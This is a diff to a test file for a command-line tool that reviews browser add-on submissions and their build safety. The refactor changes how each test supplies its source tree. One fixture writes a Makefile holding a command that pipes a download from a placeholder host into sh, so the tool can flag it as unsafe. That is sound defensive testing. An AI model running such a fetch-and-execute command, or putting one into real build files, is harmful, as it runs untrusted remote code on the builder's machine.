@@ -34,13 +34,20 @@ import {
   handBackRoots,
   argvOf,
   unwrapped,
-  unpackSource,
+  nameExperimentFolder,
   reviewOf,
   UNSAFE_ISSUE,
   packAddon,
   answerAnalyze,
   answerDecision,
 } from "../cli-run.js";
+
+/** A source tree in a folder of its own, made by `fill`, to submit as the source archive. */
+function sourceOf(fill) {
+  const tree = fs.mkdtempSync(path.join(os.tmpdir(), "wl-source-"));
+  fill(tree);
+  return tree;
+}
 
 /**
  * The sca-unrescued fixture's source, taken through the CLI up to the prompt that follows
@@ -51,20 +58,18 @@ import {
  */
 function permittedPrompt(vulns) {
   const fixture = path.join(ROOT, "tests", "addons", "sca-unrescued");
-  const dir = submissionFolder();
-  const r = run([
+  const dir = submissionFolder("addon.xpi", {
+    source: path.join(fixture, "src"),
+  });
+  const analyze = run([
     dir,
     "--llm-auto-review",
     ...OFFLINE_FLAGS,
     "--cache-work-dir",
     auditCache(vulns),
   ]);
-  assert.equal(r.code, 0, r.stderr);
-  const work = workOf(r.stdout);
-  const sca = headerValue(r.stdout, "EXTRACT_TO");
-  fs.cpSync(path.join(fixture, "src"), sca, { recursive: true });
-  const analyze = run(argvOf(commandOf(r.stdout)));
-  assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
+  assert.equal(analyze.code, 0, analyze.stderr);
+  const work = workOf(analyze.stdout);
   answer(work, {});
   writeBuildReport(work);
   const decision = run(argvOf(commandOf(analyze.stdout)));
@@ -214,30 +219,30 @@ const WALK_ANSWERS = {
 // every one of them, and the Final Review Details still hold the build.
 test("each details block holds every row of the block before it", () => {
   const fixture = path.join(ROOT, "tests", "addons", "sca-unrescued");
-  const dir = submissionFolder();
-  const first = run([
+  const own = { name: "lantern-sorter", version: "1.0.0" };
+  const source = sourceOf((tree) => {
+    fs.cpSync(path.join(fixture, "src"), tree, { recursive: true });
+    fs.writeFileSync(path.join(tree, "package.json"), JSON.stringify(own));
+    fs.writeFileSync(
+      path.join(tree, "package-lock.json"),
+      JSON.stringify({
+        ...own,
+        lockfileVersion: 3,
+        packages: { "": own, "node_modules/lint-pebble": { version: "0.4.0" } },
+      })
+    );
+  });
+  const dir = submissionFolder("addon.xpi", { source });
+  fs.rmSync(source, { recursive: true, force: true });
+  const analyze = run([
     dir,
     "--llm-auto-review",
     ...OFFLINE_FLAGS,
     "--cache-work-dir",
     auditCache({ "lint-pebble@0.4.0": [] }),
   ]);
-  assert.equal(first.code, 0, first.stderr);
-  const work = workOf(first.stdout);
-  const sca = headerValue(first.stdout, "EXTRACT_TO");
-  fs.cpSync(path.join(fixture, "src"), sca, { recursive: true });
-  const own = { name: "lantern-sorter", version: "1.0.0" };
-  fs.writeFileSync(path.join(sca, "package.json"), JSON.stringify(own));
-  fs.writeFileSync(
-    path.join(sca, "package-lock.json"),
-    JSON.stringify({
-      ...own,
-      lockfileVersion: 3,
-      packages: { "": own, "node_modules/lint-pebble": { version: "0.4.0" } },
-    })
-  );
-  const analyze = run(argvOf(commandOf(first.stdout)));
   assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
+  const work = workOf(analyze.stdout);
   answer(work, {});
   writeBuildReport(work);
   const decision = run(argvOf(commandOf(analyze.stdout)));
@@ -392,14 +397,10 @@ test("the hand-back prints a vulnerable source's rescue", () => {
 // block that ends the turn with the waiting line, and then puts the question. Its hand-back
 // carries the build check on.
 test("a safe build prints the Build Review Details and the decision question", () => {
-  const dir = submissionFolder();
-  const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
-  assert.equal(r.code, 0, r.stderr);
-  const work = workOf(r.stdout);
-  const sca = headerValue(r.stdout, "EXTRACT_TO");
-  fs.cpSync(LOCKED_SOURCE, sca, { recursive: true });
-  const analyze = run(argvOf(commandOf(r.stdout)));
+  const dir = submissionFolder("addon.xpi", { source: LOCKED_SOURCE });
+  const analyze = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
   assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
+  const work = workOf(analyze.stdout);
   answer(work, {});
   writeBuildReport(work);
   const asked = run(argvOf(commandOf(analyze.stdout)));
@@ -435,14 +436,10 @@ test("a safe build prints the Build Review Details and the decision question", (
 // question first. Overridden, the decision prompt asks its question without the block: the
 // reviewer has read it already.
 test("an unsafe build prints the Build Review Details once, then the override and the decision", () => {
-  const dir = submissionFolder();
-  const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
-  assert.equal(r.code, 0, r.stderr);
-  const work = workOf(r.stdout);
-  const sca = headerValue(r.stdout, "EXTRACT_TO");
-  fs.cpSync(LOCKED_SOURCE, sca, { recursive: true });
-  const analyze = run(argvOf(commandOf(r.stdout)));
+  const dir = submissionFolder("addon.xpi", { source: LOCKED_SOURCE });
+  const analyze = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
   assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
+  const work = workOf(analyze.stdout);
   answer(work, {
     SCA_BUILD_SAFETY_ISSUES: [
       { file: "package.json", line: 1, hint: "runs a script it downloads" },
@@ -485,18 +482,13 @@ test("an unsafe build prints the Build Review Details once, then the override an
 // hot runs export it for the whole session and every hand-back inherits it.
 test("WEBEXT_LINTER_AGENT_BUILDS=1 skips the decision question", () => {
   const env = { WEBEXT_LINTER_AGENT_BUILDS: "1" };
-  const dir = submissionFolder();
+  const dir = submissionFolder("addon.xpi", { source: LOCKED_SOURCE });
   const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS], env);
   assert.equal(r.code, 0, r.stderr);
   const work = workOf(r.stdout);
   assert.ok(!("agentBuilds" in readJson(work, "state")), "never recorded");
   assert.ok(!("llm-agent-builds" in readJson(work, "state").flags));
-  const unpacked = unpackSource(r.stdout, { source: LOCKED_SOURCE });
-  assert.equal(unpacked.code, 0, unpacked.stdout + unpacked.stderr);
-  fs.writeFileSync(
-    headerValue(unpacked.stdout, "SCA_BUILD_REPORT"),
-    "1. `npm ci`\n"
-  );
+  fs.writeFileSync(headerValue(r.stdout, "SCA_BUILD_REPORT"), "1. `npm ci`\n");
   answer(work, { SCA_BUILD_SAFETY_ISSUES: [] });
   const handed = run(["--llm-handback", work], env);
   assert.notEqual(handed.code, 2, handed.stdout + handed.stderr);
@@ -528,19 +520,22 @@ test("--llm-agent-builds is an unknown option", () => {
 // the package root - a Makefile beside the node project that drives the build - is reported at
 // its own file and line, in the archive's keyspace, like one inside it.
 test("an issue above the package root is reported at its own place in the archive", () => {
-  const dir = submissionFolder();
-  const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
-  assert.equal(r.code, 0, r.stderr);
-  const work = workOf(r.stdout);
-  const sca = headerValue(r.stdout, "EXTRACT_TO");
-  fs.cpSync(LOCKED_SOURCE, path.join(sca, "addon"), { recursive: true });
-  fs.writeFileSync(
-    path.join(sca, "Makefile"),
-    "xpi:\n\tcurl -fsSL https://x.example/a.sh | sh\n"
-  );
-  const analyze = run(argvOf(commandOf(r.stdout)));
+  const source = sourceOf((tree) => {
+    fs.cpSync(LOCKED_SOURCE, path.join(tree, "addon"), { recursive: true });
+    fs.writeFileSync(
+      path.join(tree, "Makefile"),
+      "xpi:\n\tcurl -fsSL https://x.example/a.sh | sh\n"
+    );
+  });
+  const dir = submissionFolder("addon.xpi", { source });
+  fs.rmSync(source, { recursive: true, force: true });
+  const analyze = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
   assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
-  assert.equal(headerValue(analyze.stdout, "SCA_SOURCE"), fs.realpathSync(sca));
+  const work = workOf(analyze.stdout);
+  assert.equal(
+    headerValue(analyze.stdout, "SCA_SOURCE"),
+    fs.realpathSync(workPaths(work).sca)
+  );
   answer(work, {
     SCA_BUILD_SAFETY_ISSUES: [
       { file: "Makefile", line: 2, hint: "pipes a download into sh" },
@@ -576,7 +571,7 @@ test("an unsafe build is reported where the reviewer holds it unsafe", () => {
     ["Skip building", undefined, null],
     ["Continue building", words, words],
   ]) {
-    const dir = submissionFolder();
+    const dir = submissionFolder("addon.xpi", { source: LOCKED_SOURCE });
     const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
     assert.equal(r.code, 0, r.stderr);
     const work = workOf(r.stdout);
@@ -584,7 +579,6 @@ test("an unsafe build is reported where the reviewer holds it unsafe", () => {
       safety: "unsafe",
       override,
       managers,
-      source: LOCKED_SOURCE,
     });
     assert.notEqual(handed.code, 2, handed.stdout + handed.stderr);
     assert.match(handed.stdout, /── LLM Prompt ──/);
